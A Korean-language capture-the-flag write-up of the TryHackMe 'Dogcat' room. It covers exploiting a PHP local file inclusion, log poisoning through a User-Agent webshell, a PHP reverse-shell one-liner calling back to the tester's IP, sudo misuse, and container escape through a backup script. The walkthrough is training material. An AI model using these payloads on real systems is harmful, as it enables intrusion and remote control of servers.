---
layout: single
title: (THM) Dogcat - WriteUP
categories: THM
tag: [THM,TryHackMe, Pentest, Pentesting, LFI, apache, access.log, log poisoning,php, container]
toc: true
author_profile: false
---

해당 문제는 [https://tryhackme.com/r/room/dogcat](https://tryhackme.com/r/room/dogcat) 에서 확인할 수 있습니다.

# Dogcat 시스템 모의 침투
## 수행 내용
1. 정보 수집
2. 웹 서비스 내에 LFI 취약점 존재 access.log 파일 열람을 통한 log poisoning 공격
3. 잘못된 sudo 권한 부여로 인한 root 권한 획득
4. 컨테이너 환경이었으며, 컨테이너와 호스트 사이의 공유 디렉터리로 보이는 구간에서의 백업 스크립트 발견
5. 백업스크립트 조작으로 호스트 root권한 획득 
## 정보수집
### Nmap 스캔 - 사용중인 포트 및 배너, 기본 정보 수집

```
nmap -p- --max-retries 1 -Pn -n --open --min-rate 5000 -T4 -sV -sC -A -oA ./dogcat {target_ip}
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-03 08:04 EDT
Nmap scan report for 10.10.19.95
Host is up (0.41s latency).
Not shown: 35315 filtered tcp ports (no-response), 30218 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2431192ab1971a044e2c36ac840a7587 (RSA)
|   256 213d461893aaf9e7c9b54c0f160b71e1 (ECDSA)
|_  256 c1fb7d732b574a8bdcd76f49bb3bd020 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.89 seconds
```

- 22(SSH), 80(HTTP) 포트로 서비스 동작중 확인
- Web Service는 아파치 2.4.38 버전 사용인 걸로 확인
- OpenSSH 7.6p1 으로 확인

![그림 1-1](/assets/image/write-up/thm_dogcat/image.png)
- 웹 서비스 동작중이므로, 웹 사이트 접속 시도
- a dog, a cat 버튼이 존재하며, 해당 버튼을 누르게되면 각 동물 사진이 출력됨.
- 해당 페이지 소스에서는 하드코딩된 정보와 같은 유의미한 정보는 없음

### view 파라미터 발견 후 LFI 취약점 확인

![그림 1-2](/assets/image/write-up/thm_dogcat/image-1.png)
- 해당 존재하는 버튼 클릭시 사진이 출력되며 URI 를 자세히 보게 되면
- view 파라미터를 통해 페이지를 불러오는 듯 하다.
- LFI 취약점 존재 유/무를 확인했다.

## 취약점 분석
```
/?view=../../../../etc/passwd
```

![그림 1-3](/assets/image/write-up/thm_dogcat/image-2.png)
- 파라미터의 인자값으로 dogs 혹은 cats만 가능하다고 한다.

```
/?view=dog/../../../etc/passwd
```

![그림 1-4](/assets/image/write-up/thm_dogcat/image-3.png)
- 이번에는 존재하지 않는다는 오류가 발생했으며
- 이전 오류와는 다른 내용이다. 즉 dog 혹은 cat만 가능한 필터는 우회가 가능하다.
- 출력되는 에러의 내용으로 추측해보면, 입력한 값에 확장자를 .php가 붙는듯 하다.

```
/?view=dog/../index
```
### PHP Filter 우회를 통한 LFI 공격 후 Index 파일 소스 열람

![그림 1-5](/assets/image/write-up/thm_dogcat/image-4.png)
- 경로순회를 하며 index 페이지를 찾았으며,
- index 페이지가 존재하는 경로는 찾았으나, 파일이 열리지 않는다.
- 이 떄 PHP Filter을 통해 우회를 시도했다.

![그림 1-6](/assets/image/write-up/thm_dogcat/image-5.png)
- 성공적으로 base64 인코딩 값이 출력됨

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

### 적용되어있는 필터링 로직 확인 및 access.log 접근

- 해당 값을 디코딩한 결과 위와 같은 소스코드가 발견 됐다.
- 숨겨진 ext파라미터가 존재 했으며, ext 파라미터의 값이 없으면 자동으로 입력값의 뒤에 .php 확장자를 붙이게 된다. 
- 이 때문에 이전 passwd 파일에 php 확장자가 붙은 거 같다.
- view 파라미터 값에 dog 혹은 cat 문자열이 있는지도 확인하며 둘 중 하나가 포함된다면 ext값(파라미터가 전달이 되지 않으면 .php)가 붙은 상태로 include된다.
- 이를 통해 LFI 취약점이 존재하며, passwd 파일 또한 열람이 가능했다.
- LFI 취약점이 존재하며, 해당 서비스에서 Apache2 서비스가 동작중이니 access.log 파일 열람을 시도했다.

```
/?view=php://filter/convert.base64-encode/resource=dog/../../../../../var/log/apache2/access.log&ext=
```

```
127.0.0.1 - - [04/Apr/2024:13:12:12 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:12:47 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:13:22 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:13:58 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.4.47.45 - - [04/Apr/2024:13:14:07 +0000] "GET / HTTP/1.1" 200 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
10.4.47.45 - - [04/Apr/2024:13:14:08 +0000] "GET /style.css HTTP/1.1" 200 662 "http://10.10.237.253/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
10.4.47.45 - - [04/Apr/2024:13:14:10 +0000] "GET /favicon.ico HTTP/1.1" 404 455 "http://10.10.237.253/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
10.4.47.45 - - [04/Apr/2024:13:14:11 +0000] "GET /?view=dog HTTP/1.1" 200 527 "http://10.10.237.253/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
10.4.47.45 - - [04/Apr/2024:13:14:11 +0000] "GET /dogs/5.jpg HTTP/1.1" 200 29448 "http://10.10.237.253/?view=dog" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
127.0.0.1 - - [04/Apr/2024:13:14:38 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:15:19 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:15:59 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.4.47.45 - - [04/Apr/2024:13:15:59 +0000] "GET /?view=../../../../etc/passwd HTTP/1.1" 200 520 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
127.0.0.1 - - [04/Apr/2024:13:16:39 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.4.47.45 - - [04/Apr/2024:13:17:04 +0000] "GET /?view=dogs HTTP/1.1" 200 656 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
10.4.47.45 - - [04/Apr/2024:13:17:10 +0000] "GET /?view=dogs HTTP/1.1" 200 656 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
10.4.47.45 - - [04/Apr/2024:13:17:14 +0000] "GET /?view=dog HTTP/1.1" 200 527 "http://10.10.237.253/?view=dogs" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
127.0.0.1 - - [04/Apr/2024:13:17:17 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.4.47.45 - - [04/Apr/2024:13:17:34 +0000] "GET /?view=dog/../../../../etc/passwd HTTP/1.1" 200 667 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
127.0.0.1 - - [04/Apr/2024:13:17:53 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:18:29 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:19:04 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.4.47.45 - - [04/Apr/2024:13:19:07 +0000] "GET /?view=dog/../../../../index HTTP/1.1" 200 661 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
10.4.47.45 - - [04/Apr/2024:13:19:14 +0000] "GET /?view=dog/../index HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
127.0.0.1 - - [04/Apr/2024:13:19:40 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.4.47.45 - - [04/Apr/2024:13:20:10 +0000] "GET /?view=dog/../../index HTTP/1.1" 200 660 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
127.0.0.1 - - [04/Apr/2024:13:20:11 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:20:42 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:21:12 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.4.47.45 - - [04/Apr/2024:13:21:41 +0000] "GET /?view=php://filter/convert.base64-encode/resource= HTTP/1.1" 200 520 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
127.0.0.1 - - [04/Apr/2024:13:21:42 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.4.47.45 - - [04/Apr/2024:13:21:47 +0000] "GET /?view=php://filter/convert.base64-encode/resource=dog/../index HTTP/1.1" 200 1214 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
127.0.0.1 - - [04/Apr/2024:13:22:12 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:22:43 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:23:13 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:23:43 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:24:14 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:24:44 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:25:14 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:25:44 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:26:15 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.4.47.45 - - [04/Apr/2024:13:26:40 +0000] "GET /?view=php://filter/convert.base64-encode/resource=dog/../../../var/log/apache2/access.log&ext= HTTP/1.1" 200 696 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
127.0.0.1 - - [04/Apr/2024:13:26:45 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:27:15 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [04/Apr/2024:13:27:46 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.4.47.45 - - [04/Apr/2024:13:27:49 +0000] "GET /?view=php://filter/convert.base64-encode/resource=dog/../../../var/log/apache2/access.log HTTP/1.1" 200 697 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
10.4.47.45 - - [04/Apr/2024:13:28:08 +0000] "GET /?view=php://filter/convert.base64-encode/resource=dog/../../../var/log/apache2/access.log&ext HTTP/1.1" 200 696 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
10.4.47.45 - - [04/Apr/2024:13:28:11 +0000] "GET /?view=php://filter/convert.base64-encode/resource=dog/../../../var/log/apache2/access.log&ext= HTTP/1.1" 200 696 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36"
127.0.0.1 - - [04/Apr/2024:13:28:16 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
```

- 성공적으로 access.log 파일에 접근이 가능 했으며,
- 해당 로그파일에는 User-Agent값이 기록된다.
- 이를 통해 Log-poisoning 공격이 가능하다.


## 내부침투


```
GET /?view=dog/../../../../../var/log/apache2/access.log&cmd=whoami&ext= HTTP/1.1
Host: 10.10.237.253
Upgrade-Insecure-Requests: 1
User-Agent: <?php system($_GET['cmd']);?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```
/?view=dog/../../../../../var/log/apache2/access.log&cmd=echo+whoami&ext= HTTP/1.1" 200 1740 "-" "www-data
"
```

- 이와 같이 User-Agent 값을 변주하여 php 코드로 시스템함수를 실행
- 그 결과 값이 실행되어 출력된 걸 알 수 있다.
- Reverse Connection또한 가능하다.

### User-Agent 값 변조를 통한 php system 함수 실행하여 Reverse Connection

![그림 1-8](/assets/image/write-up/thm_dogcat/image-6.png)
- nc 를 통해 대기

```
GET /?view=dog/../../../../../var/log/apache2/access.log&cmd=php+-r+'$sock%3dfsockopen("10.4.47.45",5252)%3bexec("sh+<%263+>%263+2>%263")%3b'&ext= HTTP/1.1

'''

User-Agent: <?php system($_GET['cmd']);?>
```

![그림 1-8](/assets/image/write-up/thm_dogcat/image-7.png)
- 성공적으로 쉘을 획득 했다.


## 관리자 권한 획득

![그림 1-9](/assets/image/write-up/thm_dogcat/image-10.png)
- sudo -l 을 통해 sudo 권한을 확인 
- root 권한으로 패스웓 없으 env 명령어 사용이 가능하다.

### sudo 명령어에 대한 잘못된 권한 부여

![그림 1-10](/assets/image/write-up/thm_dogcat/image-8.png)
- sudo의 잘못된 권한을 악용하여 root 쉘을 획득할 수 있다.


## 컨테이너 탈출

### 컨테이너 root 획득 후 공유 디렉터리로 의심되는 경로에서 백업 스크립트 변조 후 탈출

![그림 1-11](/assets/image/write-up/thm_dogcat/image-9.png)
- opt 경로 하위에 backup.sh가 존재하며 해당 스크립트를 보게되면
- /root/container을 묶어 /root/container/backup/backup.tar로 아카이브한다.
- 즉 현재 컨테이너 환경이며, 컨테이너 안에 존재하고 있다.
- 해당 컨테이너 내에서 백업을 얻기 위한 호스트와, 컨테이너 사이의 공유 폴더로 보인다.
- 즉 정기적으로 해당 스크립트를 실행시킨다.
- 즉 해당 파일 내에 Reverse shell을 얻기위한 코드를 삽입하면 호스트의 root쉘을 획득할 수 있다.

![그림 1-12](/assets/image/write-up/thm_dogcat/image-11.png)
- 이와 같이 backup.sh 쉘 스크립트를 조작

![그림 1-13](/assets/image/write-up/thm_dogcat/image-12.png)
- 포트개방 후 1~2분정도 소요 후 호스트의 root 권한을 획득할 수 있다.